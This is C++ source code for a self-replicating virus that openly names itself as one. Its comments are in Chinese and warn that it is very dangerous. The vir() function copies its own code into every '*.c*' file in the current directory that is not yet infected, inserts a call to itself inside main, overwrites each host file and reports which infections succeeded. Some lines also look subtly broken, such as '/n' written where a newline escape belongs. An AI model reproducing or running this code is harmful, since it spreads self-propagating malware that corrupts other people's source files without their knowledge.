//START
#include <windows.h>
#include <fstream>
#include <string>
#include <iostream>
using namespace std;
//此程序非常危险！请小心运行！
//请用VS运行
//保留所有权利,HuangSiJieTechnology Co. LTD. 2019-05-27
void vir()
{ 
string CurFileName = __FILE__;//绝对路径
string obCurFileName          //相对路径
   = CurFileName.substr(CurFileName.find_last_of('//') + 1,CurFileName.size()-1);      
WIN32_FIND_DATA FindFileData;
HANDLE hFind = FindFirstFile("*.c*", &FindFileData);
string VirusCode[100];//病毒代码 
string FileCode[500]; //宿主代码

int CodeLen = 0;//病毒代码长度
int FileLen = 0;//宿主代码长度 

//病毒函数调用应当插在"main("后面的第一个"{"后面 
//在C++中main有int main(),int main(int arg,char **r)等形式 
int InsertLoc = 0; 

//提取待传播的当前文件中的病毒代码 
ifstream VirusFile(obCurFileName.c_str()); 
for (CodeLen = 0;getline(VirusFile,VirusCode[CodeLen]);CodeLen++)
{
   if(VirusCode[CodeLen] == "//END")
   {
    CodeLen++;
    break;
   }
}
VirusFile.close();
//依次感染宿主文件 
while (true) 
{
   //不能感染当前.cpp文件和已感染的文件 
   if(strcmp(FindFileData.cFileName,obCurFileName.c_str())== 0)
   {
    cout<<FindFileData.cFileName<<":是感染源!/n";
   }
   else//感染其它文件 
   {
    //加载宿主文件 
    ifstream ibe(FindFileData.cFileName);
    for(FileLen = 0;getline(ibe,FileCode[FileLen]);FileLen++)
    {
     if (FileCode[FileLen].find("main") != -1)
     {
      InsertLoc = FileLen;
     }
    }
    ibe.close();
    if(FileCode[0] == "//START")//该文件已被感染 
    {
     cout<<FindFileData.cFileName<<":已携带了病毒!/n";
    }
    else if (FileLen > 500)
    {
     cout<<FindFileData.cFileName<<":文件太大了!/n";
    }
    else
    {
     //打开宿主文件
     ofstream be(FindFileData.cFileName);
     //插入病毒代码 
     for(int i = 0;i < CodeLen;i++)
     {
      be<<VirusCode[i]<<endl;
     }
     //病毒函数调用位置前文本插入 
     for(int i = 0;i < InsertLoc;i++)
     {
      be<<FileCode[i]<<endl;
     }
     //插入函数调用vir() 
     for(int i = InsertLoc;i < FileLen;i++)
     {
      int j = FileCode[i].find('{');
      if(j != -1)
      {
       FileCode[i].insert(j + 1,"/nvir();"); 
       break;
      }
     }
     //病毒函数调用位置后插入剩余文本 
     for(int i = InsertLoc;i < FileLen;i++)
     {
      be<<FileCode[i]<<endl;
     }
     be.close();
     cout<<FindFileData.cFileName<<":感染成功!/n";
    }
   }
   if (FindNextFile(hFind, &FindFileData) == false) break;
}
}
//END
int main()
{
vir();
return 0;
}